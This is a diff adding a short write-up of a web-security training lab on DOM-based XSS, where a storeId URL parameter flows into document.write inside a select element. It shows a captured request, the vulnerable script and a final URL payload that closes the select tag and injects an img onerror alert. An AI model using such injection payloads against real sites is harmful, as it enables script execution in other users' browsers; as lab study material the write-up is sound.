@@ -1,0 +1,35 @@
+DOM XSS in document.write sink using source location.search inside a select element
+
+Since this is a DOM exercise, it is a bit tricky as clicking on an item and checking stock will not add storeId to the URL, but you can see it in the request:
+
+POST /product/stock HTTP/1.1
+Host: ac981f011f1327b8802c765e00a10079.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: https://ac981f011f1327b8802c765e00a10079.web-security-academy.net
+Connection: close
+Referer: https://ac981f011f1327b8802c765e00a10079.web-security-academy.net/product?productId=14
+Cookie: session=tg08VWHdQU1JptC3qI7IxurYS3V4KDs1
+Upgrade-Insecure-Requests: 1
+
+productId=14&storeId=Milan
+
+We can append &storeId=Milan to the url to get a valid result, the new URL would look like this:
+https://ac981f011f1327b8802c765e00a10079.web-security-academy.net/product?productId=5&storeId=Milan
+
+Checking the source page, we can observe a script that is using storeId:
+
+<script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    (...)
+
+So, by replacing the storeId element with something that closes that HTML entity and inserts a new one, we can trigger our XSS
+
+Final result:
+https://ac981f011f1327b8802c765e00a10079.web-security-academy.net/product?productId=5&storeId="></select><img%20src=1%20onerror=alert(1337)>
